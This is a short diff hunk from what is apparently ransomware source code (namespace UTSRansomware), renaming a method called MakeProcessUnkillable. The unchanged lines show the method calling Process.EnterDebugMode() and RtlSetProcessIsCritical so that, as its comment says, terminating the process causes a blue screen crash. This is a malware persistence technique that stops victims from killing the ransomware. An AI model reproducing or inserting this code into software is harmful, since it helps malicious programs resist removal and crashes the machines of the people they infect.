@@ -46,7 +46,7 @@ namespace UTSRansomware
     };
 
         // Function that will cause BSOD if process terminated
-        public static void makeProcessUnkillable()
+        public static void MakeProcessUnkillable()
         {
             Process.EnterDebugMode();
             RtlSetProcessIsCritical(1, 0, 0);
